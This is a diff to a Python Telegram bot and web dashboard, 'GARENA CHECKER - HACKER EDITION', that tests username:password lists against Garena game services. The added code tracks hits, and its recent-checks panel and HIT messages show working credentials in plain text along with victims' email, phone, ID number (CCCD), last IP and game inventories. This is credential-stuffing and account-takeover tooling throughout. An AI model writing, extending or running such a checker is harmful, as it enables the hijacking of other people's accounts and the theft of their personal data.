@@ -53,6 +53,19 @@ AUDIO_LOCK = threading.Lock()
 # ========== FILE LUU THONG KE ==========
 STATS_FILE = "check_stats.json"
 
+# ========== SESSION STATS ==========
+SESSION_STATS = {
+    "total_checked": 0,
+    "total_hits": 0,
+    "total_dead": 0,
+    "total_errors": 0,
+    "session_start": time.time(),
+    "accounts_checked": [],
+    "hits_detail": [],
+    "recent_checks": []
+}
+SESSION_LOCK = threading.Lock()
+
 def load_stats():
     try:
         if os.path.exists(STATS_FILE):
@@ -69,7 +82,7 @@ def save_stats(stats_data):
     except:
         pass
 
-def update_stats(hit_count=0, dead_count=0, error_count=0, accounts=None):
+def update_stats(hit_count=0, dead_count=0, error_count=0, accounts=None, account_details=None):
     stats_data = load_stats()
     stats_data["total_checked"] += hit_count + dead_count + error_count
     stats_data["total_hits"] += hit_count
@@ -87,6 +100,20 @@ def update_stats(hit_count=0, dead_count=0, error_count=0, accounts=None):
         })
         if len(stats_data["history"]) > 50:
             stats_data["history"] = stats_data["history"][-50:]
+    
+    # Cap nhat session stats
+    with SESSION_LOCK:
+        SESSION_STATS["total_checked"] += hit_count + dead_count + error_count
+        SESSION_STATS["total_hits"] += hit_count
+        SESSION_STATS["total_dead"] += dead_count
+        SESSION_STATS["total_errors"] += error_count
+        if account_details:
+            SESSION_STATS["accounts_checked"].extend(account_details)
+            SESSION_STATS["recent_checks"].extend(account_details[-10:])
+            if len(SESSION_STATS["accounts_checked"]) > 1000:
+                SESSION_STATS["accounts_checked"] = SESSION_STATS["accounts_checked"][-1000:]
+            if len(SESSION_STATS["recent_checks"]) > 50:
+                SESSION_STATS["recent_checks"] = SESSION_STATS["recent_checks"][-50:]
     
     save_stats(stats_data)
     return stats_data
@@ -108,6 +135,13 @@ class RenderHandler(BaseHTTPRequestHandler):
             self.send_header('Content-type', 'application/json; charset=utf-8')
             self.end_headers()
             stats_data = load_stats()
+            with SESSION_LOCK:
+                session_data = {
+                    "session": SESSION_STATS,
+                    "uptime": time.time() - start_time,
+                    "is_checking": checking,
+                    "services": list(SERVICE_ROUTES.keys())
+                }
             stats_json = json.dumps({
                 "status": "alive",
                 "checking": checking,
@@ -116,8 +150,27 @@ class RenderHandler(BaseHTTPRequestHandler):
                 "admin": ADMIN_USERNAME,
                 "version": "6.1",
                 "audio_custom": CUSTOM_AUDIO_DATA is not None,
-                "total_stats": stats_data
-            })
+                "total_stats": stats_data,
+                "session_stats": session_data
+            }, ensure_ascii=False)
+            self.wfile.write(stats_json.encode('utf-8'))
+        elif self.path == '/api/stats/detailed':
+            self.send_response(200)
+            self.send_header('Content-type', 'application/json; charset=utf-8')
+            self.end_headers()
+            with SESSION_LOCK:
+                session_data = {
+                    "session": SESSION_STATS,
+                    "uptime": time.time() - start_time,
+                    "current_time": datetime.now().isoformat(),
+                    "is_checking": checking,
+                    "services": list(SERVICE_ROUTES.keys())
+                }
+            recent_accounts = []
+            with SESSION_LOCK:
+                recent_accounts = SESSION_STATS["recent_checks"][-50:]
+            session_data["recent_accounts"] = recent_accounts
+            stats_json = json.dumps(session_data, ensure_ascii=False)
             self.wfile.write(stats_json.encode('utf-8'))
         elif self.path == '/api/services':
             self.send_response(200)
@@ -191,21 +244,19 @@ class RenderHandler(BaseHTTPRequestHandler):
         uptime = time.time() - start_time if 'start_time' in globals() else 0
         uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime))
         
-        hits_count = 0
-        error_count = 0
-        try:
-            if os.path.exists(OUTPUT_HITS):
-                with open(OUTPUT_HITS, 'r', encoding='utf-8') as f:
-                    hits_count = len(f.readlines())
-            if os.path.exists(OUTPUT_ERROR):
-                with open(OUTPUT_ERROR, 'r', encoding='utf-8') as f:
-                    error_count = len(f.readlines())
-        except:
-            pass
+        # Lay thong ke session
+        with SESSION_LOCK:
+            session_checked = SESSION_STATS.get("total_checked", 0)
+            session_hits = SESSION_STATS.get("total_hits", 0)
+            session_dead = SESSION_STATS.get("total_dead", 0)
+            session_errors = SESSION_STATS.get("total_errors", 0)
         
+        # Lay thong ke tu file
         total_stats = load_stats()
         total_checked = total_stats.get("total_checked", 0)
         total_hits = total_stats.get("total_hits", 0)
+        total_dead = total_stats.get("total_dead", 0)
+        total_errors = total_stats.get("total_errors", 0)
         
         bot_status = "Dang check" if checking else "San sang"
         bot_color = "#ff9800" if checking else "#4caf50"
@@ -227,7 +278,7 @@ class RenderHandler(BaseHTTPRequestHandler):
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>GARENA CHECKER - HACKER EDITION</title>
+<title>GARENA CHECKER - HACKER EDITION V6.1</title>
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@400;600;700&display=swap');
 
@@ -353,11 +404,36 @@ body {
 .stat-value { font-size:1.8em; font-weight:900; margin-bottom:3px; text-shadow:0 0 30px currentColor; font-family:'Orbitron',sans-serif; }
 .stat-label { font-size:0.6em; color:#88aa88; text-transform:uppercase; letter-spacing:1px; font-weight:600; }
 .stat-hits .stat-value { color:#00ff00; }
+.stat-dead .stat-value { color:#ff4444; }
 .stat-error .stat-value { color:#ff6b35; }
 .stat-checked .stat-value { color:#00ccff; }
 .stat-total .stat-value { color:#ff00ff; }
 .stat-totalchecked .stat-value { color:#ffaa00; }
 .stat-time .stat-value { color:#ff00ff; font-size:1em; }
+
+.detail-stats {
+    background:rgba(0,0,0,0.7);
+    border-radius:12px;
+    padding:15px 20px;
+    margin:15px 0;
+    border:1px solid rgba(0,255,0,0.1);
+    display:grid;
+    grid-template-columns:repeat(auto-fit, minmax(200px, 1fr));
+    gap:10px;
+}
+.detail-row {
+    display:flex;
+    justify-content:space-between;
+    padding:5px 0;
+    border-bottom:1px solid rgba(0,255,0,0.05);
+    font-size:0.9em;
+}
+.detail-row span:first-child { color:#88aa88; }
+.detail-value { font-weight:700; }
+.hits-color { color:#00ff00; }
+.dead-color { color:#ff4444; }
+.error-color { color:#ff6b35; }
+.total-color { color:#ffaa00; }
 
 .section-title { font-size:1.6em; text-align:center; margin:25px 0 15px; text-shadow:0 0 30px rgba(0,255,0,0.2); animation:flicker 2s infinite; transform:translateZ(30px); font-family:'Orbitron',sans-serif; letter-spacing:2px; }
 .services-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(200px, 1fr)); gap:12px; margin-bottom:20px; transform:translateZ(10px); }
@@ -378,6 +454,31 @@ body {
 .service-arrow { font-size:1.2em; color:#446644; transition:all 0.3s; position:relative; z-index:2; }
 .service-card:hover .service-arrow { color:#00ff00; transform:translateX(5px); }
 
+.recent-checks {
+    background:rgba(0,0,0,0.5);
+    border-radius:12px;
+    padding:15px;
+    margin:15px 0;
+    border:1px solid rgba(0,255,0,0.08);
+    max-height:200px;
+    overflow-y:auto;
+}
+.recent-checks::-webkit-scrollbar { width:3px; }
+.recent-checks::-webkit-scrollbar-track { background:rgba(0,255,0,0.05); }
+.recent-checks::-webkit-scrollbar-thumb { background:#00ff00; border-radius:10px; }
+.recent-item {
+    display:flex;
+    justify-content:space-between;
+    padding:3px 8px;
+    font-size:0.75em;
+    border-bottom:1px solid rgba(0,255,0,0.03);
+    font-family:'Courier New',monospace;
+}
+.recent-item .status-hit { color:#00ff00; }
+.recent-item .status-dead { color:#ff4444; }
+.recent-item .status-error { color:#ff6b35; }
+.recent-item .time { color:#446644; font-size:0.8em; }
+
 .footer { text-align:center; padding:15px; color:#446644; font-size:0.7em; border-top:1px solid rgba(0,255,0,0.06); margin-top:15px; transform:translateZ(10px); font-weight:400; letter-spacing:1px; }
 .footer a { color:#00ff00; text-decoration:none; transition:all 0.3s; }
 .footer a:hover { color:#ff00ff; text-shadow:0 0 20px #ff00ff; }
@@ -390,6 +491,7 @@ body {
     .header { padding:20px; }
     .container { padding:10px; margin:10px; max-height:95vh; }
     .stat-value { font-size:1.4em; }
+    .detail-stats { grid-template-columns:1fr; }
 }
 @media (max-width:480px) {
     .title { font-size:1.4em; letter-spacing:1px; }
@@ -423,17 +525,33 @@ body {
     </div>
     
     <div class="stats-grid">
-        <div class="stat-card stat-hits"><div class="stat-value">HITS_PLACEHOLDER</div><div class="stat-label">✅ Hits</div></div>
-        <div class="stat-card stat-error"><div class="stat-value">ERROR_PLACEHOLDER</div><div class="stat-label">⚠️ Errors</div></div>
-        <div class="stat-card stat-checked"><div class="stat-value">CHECKED_PLACEHOLDER</div><div class="stat-label">🔄 Checked</div></div>
-        <div class="stat-card stat-total"><div class="stat-value">TOTAL_HITS_PLACEHOLDER</div><div class="stat-label">🏆 Tong Hits</div></div>
-        <div class="stat-card stat-totalchecked"><div class="stat-value">TOTAL_CHECKED_PLACEHOLDER</div><div class="stat-label">📊 Tong Check</div></div>
-        <div class="stat-card stat-time"><div class="stat-value">CURRENT_TIME_PLACEHOLDER</div><div class="stat-label">📅 Thoi gian</div></div>
+        <div class="stat-card stat-hits"><div class="stat-value">SESSION_HITS</div><div class="stat-label">🎯 Hits (Session)</div></div>
+        <div class="stat-card stat-dead"><div class="stat-value">SESSION_DEAD</div><div class="stat-label">❌ Dead (Session)</div></div>
+        <div class="stat-card stat-error"><div class="stat-value">SESSION_ERRORS</div><div class="stat-label">⚠️ Errors (Session)</div></div>
+        <div class="stat-card stat-checked"><div class="stat-value">SESSION_CHECKED</div><div class="stat-label">🔄 Checked (Session)</div></div>
+        <div class="stat-card stat-total"><div class="stat-value">TOTAL_HITS</div><div class="stat-label">🏆 Tong Hits</div></div>
+        <div class="stat-card stat-totalchecked"><div class="stat-value">TOTAL_CHECKED</div><div class="stat-label">📊 Tong Check</div></div>
     </div>
-    
+
+    <div class="detail-stats">
+        <div class="detail-row"><span>✅ Hits (Session):</span><span class="detail-value hits-color">SESSION_HITS</span></div>
+        <div class="detail-row"><span>❌ Dead (Session):</span><span class="detail-value dead-color">SESSION_DEAD</span></div>
+        <div class="detail-row"><span>⚠️ Errors (Session):</span><span class="detail-value error-color">SESSION_ERRORS</span></div>
+        <div class="detail-row"><span>📊 Tong da check (Session):</span><span class="detail-value total-color">SESSION_CHECKED</span></div>
+        <div class="detail-row"><span>🏆 Tong Hits (All):</span><span class="detail-value hits-color">TOTAL_HITS</span></div>
+        <div class="detail-row"><span>📊 Tong Check (All):</span><span class="detail-value total-color">TOTAL_CHECKED</span></div>
+        <div class="detail-row"><span>⏱ Thoi gian chay:</span><span class="detail-value" style="color:#00ccff;">UPTIME_PLACEHOLDER</span></div>
+        <div class="detail-row"><span>📅 Thoi gian hien tai:</span><span class="detail-value" style="color:#ff00ff;">CURRENT_TIME</span></div>
+    </div>
+
     <div class="section-title">📋 DICH VU HO TRO</div>
     <div class="services-grid">
         SERVICES_HTML_PLACEHOLDER
+    </div>
+    
+    <div class="section-title">📜 RECENT CHECKS</div>
+    <div class="recent-checks" id="recent-checks">
+        <div style="text-align:center;color:#446644;padding:10px;">Loading...</div>
     </div>
     
     <div class="footer">
@@ -628,45 +746,125 @@ document.addEventListener('click', function(e) {
 });
 
 // ========================================================================
-// 4. AUDIO
+// 4. AUDIO - FIX AUTO PLAY
 // ========================================================================
 const audio = document.getElementById('bg-audio');
+
 function playAudioDirect() {
-    audio.volume = 0.25;
+    audio.volume = 0.3;
     audio.loop = true;
-    audio.play().then(() => { console.log('🎵 Audio playing'); }).catch(e => {
-        console.log('Auto-play blocked');
-        document.addEventListener('click', function playOnce() {
-            audio.play().catch(() => {});
-            document.removeEventListener('click', playOnce);
-        }, { once: true });
-    });
+    audio.setAttribute('autoplay', '');
+    audio.muted = false;
+    
+    var playPromise = audio.play();
+    if (playPromise !== undefined) {
+        playPromise.then(function() {
+            console.log('🎵 Audio playing successfully');
+        }).catch(function(error) {
+            console.log('Auto-play blocked, waiting for user interaction');
+            document.addEventListener('click', function playOnce() {
+                audio.play().then(function() {
+                    console.log('🎵 Audio started after user click');
+                }).catch(function(e) {
+                    console.log('Still blocked: ' + e);
+                });
+                document.removeEventListener('click', playOnce);
+            }, { once: true });
+            setTimeout(function() {
+                audio.play().catch(function() {});
+            }, 1000);
+        });
+    }
 }
-audio.addEventListener('error', function() { audio.load(); setTimeout(playAudioDirect, 500); });
+
+audio.addEventListener('canplaythrough', function() {
+    if (audio.paused) {
+        audio.play().catch(function() {});
+    }
+});
+
+audio.addEventListener('error', function() {
+    console.log('Audio error, reloading...');
+    audio.load();
+    setTimeout(function() {
+        audio.play().catch(function() {});
+    }, 500);
+});
+
 setTimeout(playAudioDirect, 300);
-setInterval(() => { if (audio.paused && !audio.ended) { audio.play().catch(() => {}); } }, 5000);
+
+setInterval(function() {
+    if (audio.paused && !audio.ended && audio.readyState >= 2) {
+        audio.play().catch(function() {});
+    }
+    if (audio.error) {
+        console.log('Audio error detected, reloading...');
+        audio.load();
+        setTimeout(function() {
+            audio.play().catch(function() {});
+        }, 500);
+    }
+}, 3000);
 
 // ========================================================================
-// 5. STATS
+// 5. STATS & UI UPDATE
 // ========================================================================
 function updateStats() {
     fetch('/stats').then(r=>r.json()).then(d=>{
-        document.querySelector('.stat-hits .stat-value').textContent = d.stats?.hits || 0;
-        document.querySelector('.stat-error .stat-value').textContent = d.stats?.errors || 0;
-        document.querySelector('.stat-checked .stat-value').textContent = d.stats?.checked || 0;
+        // Update stat cards
+        document.querySelector('.stat-hits .stat-value').textContent = d.session_stats?.session?.total_hits || 0;
+        document.querySelector('.stat-dead .stat-value').textContent = d.session_stats?.session?.total_dead || 0;
+        document.querySelector('.stat-error .stat-value').textContent = d.session_stats?.session?.total_errors || 0;
+        document.querySelector('.stat-checked .stat-value').textContent = d.session_stats?.session?.total_checked || 0;
         document.querySelector('.stat-total .stat-value').textContent = d.total_stats?.total_hits || 0;
         document.querySelector('.stat-totalchecked .stat-value').textContent = d.total_stats?.total_checked || 0;
-        document.querySelector('.stat-time .stat-value').textContent = new Date().toLocaleTimeString('vi-VN');
+        
+        // Update detail stats
+        const details = document.querySelectorAll('.detail-stats .detail-value');
+        if (details.length >= 8) {
+            details[0].textContent = d.session_stats?.session?.total_hits || 0;
+            details[1].textContent = d.session_stats?.session?.total_dead || 0;
+            details[2].textContent = d.session_stats?.session?.total_errors || 0;
+            details[3].textContent = d.session_stats?.session?.total_checked || 0;
+            details[4].textContent = d.total_stats?.total_hits || 0;
+            details[5].textContent = d.total_stats?.total_checked || 0;
+        }
+        
         const badge = document.getElementById('status-badge');
         badge.textContent = d.checking ? '🔴 Dang check' : '🟢 San sang';
         badge.style.background = d.checking ? '#ff9800' : '#4caf50';
     }).catch(e=>console.log(e));
+    
+    // Update recent checks
+    fetch('/api/stats/detailed').then(r=>r.json()).then(d=>{
+        const container = document.getElementById('recent-checks');
+        const recent = d.recent_accounts || [];
+        if (recent.length === 0) {
+            container.innerHTML = '<div style="text-align:center;color:#446644;padding:10px;">Chua co acc nao duoc check</div>';
+        } else {
+            let html = '';
+            for (const item of recent.slice(-20).reverse()) {
+                const statusClass = item.status === 'hit' ? 'status-hit' : 
+                                   item.status === 'dead' ? 'status-dead' : 'status-error';
+                const statusIcon = item.status === 'hit' ? '✅' : 
+                                  item.status === 'dead' ? '❌' : '⚠️';
+                const time = item.time || new Date().toLocaleTimeString('vi-VN');
+                html += `<div class="recent-item">
+                    <span><span class="${statusClass}">${statusIcon} ${item.user}:${item.pwd}</span></span>
+                    <span class="time">${time}</span>
+                </div>`;
+            }
+            container.innerHTML = html;
+        }
+    }).catch(e=>console.log(e));
 }
+
 setInterval(updateStats, 3000);
 updateStats();
 
-console.log('🔥 GARENA CHECKER HACKER EDITION LOADED!');
+console.log('🔥 GARENA CHECKER HACKER EDITION V6.1 LOADED!');
 console.log('📊 FULL INFO - STATS SAVED TO check_stats.json');
+console.log('🎵 AUTO AUDIO FIXED - 3D EFFECTS ENABLED');
 </script>
 </body>
 </html>"""
@@ -675,12 +873,13 @@ console.log('📊 FULL INFO - STATS SAVED TO check_stats.json');
         html = html.replace('BOT_STATUS_PLACEHOLDER', bot_status)
         html = html.replace('ADMIN_USERNAME_PLACEHOLDER', ADMIN_USERNAME)
         html = html.replace('UPTIME_PLACEHOLDER', uptime_str)
-        html = html.replace('HITS_PLACEHOLDER', str(hits_count))
-        html = html.replace('ERROR_PLACEHOLDER', str(error_count))
-        html = html.replace('CHECKED_PLACEHOLDER', str(stats.get('checked', 0)))
-        html = html.replace('TOTAL_HITS_PLACEHOLDER', str(total_hits))
-        html = html.replace('TOTAL_CHECKED_PLACEHOLDER', str(total_checked))
-        html = html.replace('CURRENT_TIME_PLACEHOLDER', current_time)
+        html = html.replace('SESSION_HITS', str(session_hits))
+        html = html.replace('SESSION_DEAD', str(session_dead))
+        html = html.replace('SESSION_ERRORS', str(session_errors))
+        html = html.replace('SESSION_CHECKED', str(session_checked))
+        html = html.replace('TOTAL_HITS', str(total_hits))
+        html = html.replace('TOTAL_CHECKED', str(total_checked))
+        html = html.replace('CURRENT_TIME', current_time)
         html = html.replace('SERVICES_HTML_PLACEHOLDER', services_html)
         
         return html
@@ -1318,7 +1517,7 @@ def check_account_api(username, password, service, use_delay=True):
     return result
 
 def format_full_info(username, password, service, result_data):
-    """Format FULL INFO cho ket qua HIT"""
+    """Format FULL INFO voi nhieu truong thong tin hon"""
     service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
     icon = SERVICE_ROUTES.get(service, {}).get("icon", "✅")
     
@@ -1326,93 +1525,109 @@ def format_full_info(username, password, service, result_data):
     
     # Header
     msg = f"{line}\n{icon} <b>HIT - {service_desc}</b>\n{line}\n"
-    msg += f"🔑 <b>Account:</b> <code>{username}:{password}</code>\n\n"
+    msg += f"🔑 <b>Account:</b> <code>{username}:{password}</code>\n"
+    msg += f"📅 <b>Thoi gian:</b> <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n\n"
     
     if isinstance(result_data, dict):
-        # Danh sach field hien thi theo nhom
-        sections = {
-            "📌 THONG TIN CO BAN": [
-                ("UID", "uid"),
-                ("Username", "username"),
-                ("Nickname", "nickname"),
-                ("Region", "region"),
-                ("Server", "server"),
-                ("Shells", "shells"),
-                ("So", "so"),
-            ],
-            "🔐 BAO MAT": [
-                ("Email Verified", "email_verified"),
-                ("Email", "email"),
-                ("Mobile Bound", "mobile_bound"),
-                ("Phone", "phone"),
-                ("FB Linked", "fb_linked"),
-                ("FB", "fb"),
-                ("Password Set", "password_set"),
-                ("Account Secured", "account_secured"),
-            ],
-            "🎮 LIEN QUAN": [
-                ("AOV Name", "aov_name"),
-                ("AOV Rank", "aov_rank"),
-                ("AOV Level", "aov_level"),
-                ("AOV Banned", "aov_banned"),
-                ("Total Skins", "aov_total_skins"),
-                ("Total Champs", "aov_total_champs"),
-                ("SS Count", "aov_ss"),
-                ("SSS Count", "aov_sss"),
-                ("Anime Count", "aov_anime"),
-            ],
-            "⚽ FC ONLINE": [
-                ("FC Name", "fc_name"),
-                ("FC UID", "fc_uid"),
-                ("FC OVR", "fc_ovr"),
-                ("FC Level", "fc_level"),
-                ("FC Rank", "fc_rank"),
-            ],
-            "📅 THONG TIN KHAC": [
-                ("Garena Created", "garena_created"),
-                ("Last Login", "last_login"),
-                ("Last Session IP", "last_session_ip"),
-                ("Last Session Country", "last_session_country"),
-                ("Banned", "banned"),
-                ("Ban Until", "ban_until"),
-                ("Ban Reason", "ban_reason"),
-                ("CCCD", "cccd"),
-                ("Authen", "authen"),
-                ("Tinh Trang", "tinh_trang"),
-                ("Ngay Tao TK", "ngay_tao_tk"),
-            ]
+        # Danh sach field mo rong
+        all_fields = {
+            # Thong tin co ban
+            "🆔 UID": "uid",
+            "👤 Username": "username",
+            "📛 Nickname": "nickname",
+            "🌍 Region": "region",
+            "🖥 Server": "server",
+            "💎 Shells": "shells",
+            "🔢 So": "so",
+            
+            # Bao mat
+            "📧 Email Verified": "email_verified",
+            "📧 Email": "email",
+            "📱 Mobile Bound": "mobile_bound",
+            "📱 Phone": "phone",
+            "🔗 FB Linked": "fb_linked",
+            "🔗 FB": "fb",
+            "🔐 Password Set": "password_set",
+            "🛡 Account Secured": "account_secured",
+            
+            # Lien Quan
+            "🎮 AOV Name": "aov_name",
+            "🏆 AOV Rank": "aov_rank",
+            "📊 AOV Level": "aov_level",
+            "🚫 AOV Banned": "aov_banned",
+            "👗 Total Skins": "aov_total_skins",
+            "⚔ Total Champs": "aov_total_champs",
+            "⭐ SS Count": "aov_ss",
+            "🔥 SSS Count": "aov_sss",
+            "🎨 Anime Count": "aov_anime",
+            
+            # FC Online
+            "⚽ FC Name": "fc_name",
+            "🆔 FC UID": "fc_uid",
+            "📊 FC OVR": "fc_ovr",
+            "📈 FC Level": "fc_level",
+            "🏅 FC Rank": "fc_rank",
+            
+            # Thong tin khac
+            "📅 Garena Created": "garena_created",
+            "⏰ Last Login": "last_login",
+            "🌐 Last Session IP": "last_session_ip",
+            "🌍 Last Session Country": "last_session_country",
+            "🚫 Banned": "banned",
+            "⏳ Ban Until": "ban_until",
+            "📝 Ban Reason": "ban_reason",
+            "🪪 CCCD": "cccd",
+            "🔑 Authen": "authen",
+            "📌 Tinh Trang": "tinh_trang",
+            "📅 Ngay Tao TK": "ngay_tao_tk",
+            
+            # Them truong moi
+            "💰 Gold": "gold",
+            "💎 Voucher": "voucher",
+            "📊 Level": "level",
+            "⭐ Star": "star",
+            "🏅 Rank": "rank",
+            "🎯 Win Rate": "win_rate",
+            "📈 Total Match": "total_match",
+            "👥 Friends": "friends",
+            "📦 Inventory": "inventory",
+            "🎁 Gifts": "gifts",
+            "📝 Bio": "bio",
+            "🌐 Language": "language",
+            "📱 Device": "device",
+            "🔄 Last Update": "last_update",
+            "⏱ Online Status": "online_status",
+            "📊 Exp": "exp",
+            "🎖 Title": "title",
+            "🏆 Achievement": "achievement",
+            "📅 Join Date": "join_date",
         }
         
         info_lines = []
-        
-        for section_name, fields in sections.items():
-            section_items = []
-            for label, field in fields:
-                if field in result_data and result_data[field] is not None and result_data[field] != "" and result_data[field] != "N/A":
-                    value = result_data[field]
-                    
-                    if isinstance(value, (int, float)) and value == 0:
-                        continue
-                    if isinstance(value, str) and value in ["0", "00", "000", "False", "false"]:
-                        continue
-                    if isinstance(value, bool):
-                        value = "YES" if value else "NO"
-                    
-                    if isinstance(value, str):
-                        value = fix_encoding(value)
-                    
-                    section_items.append(f"  {label}: {value}")
-            
-            if section_items:
-                info_lines.append(f"\n{section_name}")
-                info_lines.extend(section_items)
+        for label, field in all_fields.items():
+            if field in result_data and result_data[field] is not None and result_data[field] != "" and result_data[field] != "N/A":
+                value = result_data[field]
+                
+                if isinstance(value, (int, float)) and value == 0:
+                    continue
+                if isinstance(value, str) and value in ["0", "00", "000", "False", "false", "None", "null"]:
+                    continue
+                if isinstance(value, bool):
+                    value = "YES" if value else "NO"
+                
+                if isinstance(value, str):
+                    value = fix_encoding(value)
+                
+                info_lines.append(f"{label}: <code>{value}</code>")
         
         # Danh sach SS, SSS, Anime
         list_fields = [
             ("✨ SS List", "aov_ss_list"),
             ("🔥 SSS List", "aov_sss_list"),
             ("🎨 Anime List", "aov_anime_list"),
-            ("🎲 Other List", "aov_other_list")
+            ("🎲 Other List", "aov_other_list"),
+            ("📦 Item List", "item_list"),
+            ("🎁 Gift List", "gift_list"),
         ]
         
         for label, field in list_fields:
@@ -1421,7 +1636,7 @@ def format_full_info(username, password, service, result_data):
                 if isinstance(value, list) and value:
                     value = [fix_encoding(str(item)) for item in value]
                     info_lines.append(f"\n{label}:")
-                    for item in value[:30]:  # Gioi han 30 item
+                    for item in value[:30]:
                         info_lines.append(f"  • {item}")
                     if len(value) > 30:
                         info_lines.append(f"  ... va {len(value) - 30} item khac")
@@ -1450,16 +1665,24 @@ def check_single(chat_id, username, password, service="lienquan"):
     result = check_account_api(username, password, service, use_delay=False)
     result_type = result.get("result", "unknown")
     
+    account_detail = {
+        "user": username,
+        "pwd": password,
+        "service": service,
+        "status": result_type,
+        "time": datetime.now().strftime("%H:%M:%S")
+    }
+    
     if result_type == "hit":
         hit_msg = format_full_info(username, password, service, result)
         safe_send_message(chat_id, hit_msg)
-        update_stats(hit_count=1)
+        update_stats(hit_count=1, account_details=[account_detail])
     elif result_type == "dead":
         safe_send_message(chat_id, format_dead_info(username, password, service))
-        update_stats(dead_count=1)
+        update_stats(dead_count=1, account_details=[account_detail])
     else:
         safe_send_message(chat_id, format_error_info(username, password, service))
-        update_stats(error_count=1)
+        update_stats(error_count=1, account_details=[account_detail])
 
 def check_batch(chat_id, accounts, service):
     global checking, stats
@@ -1515,12 +1738,14 @@ def check_batch(chat_id, accounts, service):
         result_type = result.get("result", "unknown")
         
         # Luu ket qua
-        all_results.append({
+        account_detail = {
             "user": user,
             "pwd": pwd,
+            "service": service,
             "status": result_type,
-            "data": result
-        })
+            "time": datetime.now().strftime("%H:%M:%S")
+        }
+        all_results.append(account_detail)
         
         with stats_lock:
             stats["checked"] += 1
@@ -1575,8 +1800,14 @@ def check_batch(chat_id, accounts, service):
     checking = False
     elapsed = time.time() - stats["start_time"]
     
-    # Cap nhat thong ke tong
-    update_stats(hit_count=stats["hits"], dead_count=stats["dead"], error_count=stats["errors"], accounts=accounts)
+    # Cap nhat thong ke tong voi chi tiet
+    update_stats(
+        hit_count=stats["hits"], 
+        dead_count=stats["dead"], 
+        error_count=stats["errors"], 
+        accounts=accounts,
+        account_details=all_results
+    )
     
     # Gui tong ket
     summary = f"""
@@ -1662,12 +1893,14 @@ def check_all_services(chat_id, accounts):
         result = check_account_api(user, pwd, service, use_delay=False)
         result_type = result.get("result", "unknown")
         
-        all_results.append({
+        account_detail = {
             "user": user,
             "pwd": pwd,
             "service": service,
-            "status": result_type
-        })
+            "status": result_type,
+            "time": datetime.now().strftime("%H:%M:%S")
+        }
+        all_results.append(account_detail)
         
         with stats_lock:
             stats_all["checked"] += 1
@@ -1731,7 +1964,13 @@ def check_all_services(chat_id, accounts):
     elapsed = time.time() - stats_all["start_time"]
     
     # Cap nhat thong ke tong
-    update_stats(hit_count=stats_all["hits"], dead_count=stats_all["dead"], error_count=stats_all["errors"], accounts=accounts)
+    update_stats(
+        hit_count=stats_all["hits"], 
+        dead_count=stats_all["dead"], 
+        error_count=stats_all["errors"], 
+        accounts=accounts,
+        account_details=all_results
+    )
     
     summary = f"""
 ✅ CHECK ALL HOAN TAT!
@@ -1829,6 +2068,9 @@ def cmd_stats(message):
         return
     
     stats_data = load_stats()
+    with SESSION_LOCK:
+        session = SESSION_STATS
+    
     msg = f"""
 📊 <b>THONG KE TONG</b>
 ━━━━━━━━━━━━━━━━━━━━━━
@@ -1836,6 +2078,13 @@ def cmd_stats(message):
 ✅ Tong hits: <code>{stats_data.get('total_hits', 0)}</code>
 ❌ Tong dead: <code>{stats_data.get('total_dead', 0)}</code>
 ⚠️ Tong errors: <code>{stats_data.get('total_errors', 0)}</code>
+
+📊 <b>SESSION NAY</b>
+📦 Da check: <code>{session.get('total_checked', 0)}</code>
+✅ Hits: <code>{session.get('total_hits', 0)}</code>
+❌ Dead: <code>{session.get('total_dead', 0)}</code>
+⚠️ Errors: <code>{session.get('total_errors', 0)}</code>
+
 ⏰ Lan check cuoi: <code>{stats_data.get('last_check', 'Chua co')}</code>
 """
     safe_send_message(message.chat.id, msg)
